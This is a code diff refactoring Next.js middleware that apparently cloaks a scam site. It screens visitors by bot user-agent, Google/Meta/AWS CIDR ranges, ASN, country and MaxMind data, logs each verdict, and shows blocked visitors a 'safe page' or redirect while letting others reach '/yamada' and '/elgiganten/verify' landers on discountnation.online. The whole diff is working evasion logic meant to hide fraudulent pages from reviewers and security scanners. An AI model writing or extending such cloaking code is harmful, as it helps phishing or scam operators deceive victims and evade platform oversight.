@@ -268,60 +268,104 @@ async function maxmindLookup(req: NextRequest, ip: string) {
   }
 }
 
-/* ========= Guard: full check (returns true if visitor should be BLOCKED) ========= */
-async function isBlocked(req: NextRequest, ip: string | null): Promise<boolean> {
+/* ========= Guard result type ========= */
+interface GuardResult {
+  blocked: boolean;
+  reason: string;
+  checks: Record<string, string>;
+  country?: string;
+  countryCode?: string;
+  asn?: string;
+  isp?: string;
+}
+
+/* ========= Guard: full check ========= */
+async function runGuard(req: NextRequest, ip: string | null): Promise<GuardResult> {
   const ua = req.headers.get("user-agent") || "";
+  const checks: Record<string, string> = {};
 
   // 1. Bot UA
-  if (BOT_UA.test(ua)) {
+  const botMatch = BOT_UA.test(ua);
+  checks["bot_ua"] = botMatch ? "BLOCKED" : "pass";
+  if (botMatch) {
     log("Guard: block by bot UA");
-    return true;
+    return { blocked: true, reason: "bot_ua", checks };
   }
 
-  // 2. Header sanity (missing UA or Accept-Language)
-  if (hasSuspiciousHeaders(req)) {
+  // 2. Header sanity
+  const suspHeaders = hasSuspiciousHeaders(req);
+  checks["headers"] = suspHeaders ? "BLOCKED" : "pass";
+  if (suspHeaders) {
     log("Guard: block by suspicious headers");
-    return true;
+    return { blocked: true, reason: "suspicious_headers", checks };
   }
 
   if (!ip) {
+    checks["ip"] = "BLOCKED (missing)";
     log("Guard: block — no IP");
-    return true;
+    return { blocked: true, reason: "no_ip", checks };
   }
+  checks["ip"] = "present";
 
-  // 3. CIDR block (Google, Meta, AWS, etc.)
-  if (isBlockedCidr(ip)) {
+  // 3. CIDR
+  const cidrBlocked = isBlockedCidr(ip);
+  checks["cidr"] = cidrBlocked ? "BLOCKED" : "pass";
+  if (cidrBlocked) {
     log("Guard: block by CIDR:", ip);
-    return true;
+    return { blocked: true, reason: "cidr", checks };
   }
 
-  // 4. IPinfo checks
+  // 4. IPinfo
   const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
+  checks["ipinfo"] = lite ? "fetched" : "failed/skipped";
+
+  const asn = lite?.asn || "";
+  const ispName = (lite as any)?.as_name || "";
+  const countryCode = (lite as any)?.country_code || "";
+  const country = lite?.country || "";
 
   // 5. Provider / ASN
-  if (matchesBadProviderLite(lite)) {
+  const providerBlocked = matchesBadProviderLite(lite);
+  checks["provider"] = providerBlocked ? "BLOCKED" : "pass";
+  if (providerBlocked) {
     log("Guard: block by provider");
-    return true;
+    return { blocked: true, reason: "provider_asn", checks, asn, isp: ispName, countryCode, country };
   }
 
   // 6. Country
-  if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
+  const countryBlocked = lite && isBlockedByCountry({ code: countryCode, name: country });
+  const noCountry = ALLOWED_COUNTRIES.size > 0 && (!lite || (!countryCode && !country));
+  checks["country"] = countryBlocked ? "BLOCKED" : noCountry ? "BLOCKED (missing)" : "pass";
+  if (countryBlocked) {
     log("Guard: block by country");
-    return true;
+    return { blocked: true, reason: "country", checks, asn, isp: ispName, countryCode, country };
   }
-  if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
+  if (noCountry) {
     log("Guard: block — no country while allow-only active");
-    return true;
+    return { blocked: true, reason: "country_missing", checks, asn, isp: ispName };
   }
 
-  // 7. MaxMind secondary
+  // 7. MaxMind
   const mm = await maxmindLookup(req, ip);
+  checks["maxmind"] = mm?.isBad ? "BLOCKED" : mm ? "pass" : "failed/skipped";
   if (mm?.isBad) {
-    log("Guard: block by MaxMind");
-    return true;
+    log("Guard: block by MaxMind:", mm.reason);
+    return { blocked: true, reason: `maxmind:${mm.reason || "bad"}`, checks, asn, isp: mm.isp || ispName, countryCode, country };
   }
 
-  return false;
+  return { blocked: false, reason: "allowed", checks, asn, isp: ispName, countryCode, country };
+}
+
+/* ========= Fire-and-forget shield log ========= */
+function sendShieldLog(req: NextRequest, entry: Record<string, any>) {
+  try {
+    const url = new URL("/api/shield-log", req.nextUrl.origin);
+    fetch(url.toString(), {
+      method: "POST",
+      headers: { "content-type": "application/json", "x-mw": "1" },
+      body: JSON.stringify(entry),
+    }).catch(() => {});
+  } catch {}
 }
 
 /* ========= Middleware ========= */
@@ -338,8 +382,22 @@ export async function middleware(req: NextRequest) {
   //   URL always stays discountnation.online/yamada
   // ──────────────────────────────────────────────────────────────────────
   if (pathname === "/yamada" || pathname === "/yamada/") {
-    const blocked = await isBlocked(req, ip);
-    if (blocked) {
+    const guard = await runGuard(req, ip);
+    const verdict = guard.blocked ? "blocked" : "allowed";
+    sendShieldLog(req, {
+      ts: Date.now(),
+      ip,
+      ua,
+      path: pathname,
+      verdict,
+      reason: guard.reason,
+      checks: guard.checks,
+      country: guard.country || "",
+      countryCode: guard.countryCode || "",
+      asn: guard.asn || "",
+      isp: guard.isp || "",
+    });
+    if (guard.blocked) {
       log("Guard → show safe page (page.tsx)");
       return NextResponse.next();
     }
@@ -352,33 +410,24 @@ export async function middleware(req: NextRequest) {
   // ──────────────────────────────────────────────────────────────────────
   if (pathname.startsWith("/yamada/verify") || pathname.startsWith("/yamada/lander")) {
     const REDIRECT_URL = "/yamada";
+    const guard = await runGuard(req, ip);
+    sendShieldLog(req, {
+      ts: Date.now(),
+      ip,
+      ua,
+      path: pathname,
+      verdict: guard.blocked ? "blocked" : "allowed",
+      reason: guard.reason,
+      checks: guard.checks,
+      country: guard.country || "",
+      countryCode: guard.countryCode || "",
+      asn: guard.asn || "",
+      isp: guard.isp || "",
+    });
 
-    if (BOT_UA.test(ua)) {
-      log("Block bot on sub-route →", REDIRECT_URL);
+    if (guard.blocked) {
+      log("Block on sub-route →", REDIRECT_URL);
       return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
-    }
-
-    if (ip) {
-      const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
-
-      if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
-        log("Block by country on sub-route");
-        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
-      }
-      if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
-        log("Block by missing country on sub-route");
-        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
-      }
-      if (matchesBadProviderLite(lite)) {
-        log("Block by provider on sub-route");
-        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
-      }
-
-      const mm = await maxmindLookup(req, ip);
-      if (mm?.isBad) {
-        log("Block by MaxMind on sub-route");
-        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
-      }
     }
 
     log("Allow through sub-route");
@@ -389,34 +438,24 @@ export async function middleware(req: NextRequest) {
   // /elgiganten/verify/* — existing logic (unchanged)
   // ──────────────────────────────────────────────────────────────────────
   const REDIRECT_URL = getRedirectUrl(pathname);
+  const guard = await runGuard(req, ip);
+  sendShieldLog(req, {
+    ts: Date.now(),
+    ip,
+    ua,
+    path: pathname,
+    verdict: guard.blocked ? "blocked" : "allowed",
+    reason: guard.reason,
+    checks: guard.checks,
+    country: guard.country || "",
+    countryCode: guard.countryCode || "",
+    asn: guard.asn || "",
+    isp: guard.isp || "",
+  });
 
-  if (BOT_UA.test(ua)) {
-    log("Block by UA bot signature");
+  if (guard.blocked) {
+    log("Block →", REDIRECT_URL);
     return NextResponse.redirect(REDIRECT_URL, { status: 302 });
-  }
-
-  if (ip) {
-    const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
-
-    if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
-      log("Block by country:", { code: (lite as any).country_code, name: lite.country });
-      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
-    }
-    if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
-      log("Block by country: missing code while allow-only active");
-      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
-    }
-
-    if (matchesBadProviderLite(lite)) {
-      log("Redirect (IPinfo match) →", REDIRECT_URL);
-      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
-    }
-
-    const mm = await maxmindLookup(req, ip);
-    if (mm?.isBad) {
-      log("Redirect (MaxMind match) →", REDIRECT_URL);
-      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
-    }
   }
 
   log("Allow through");
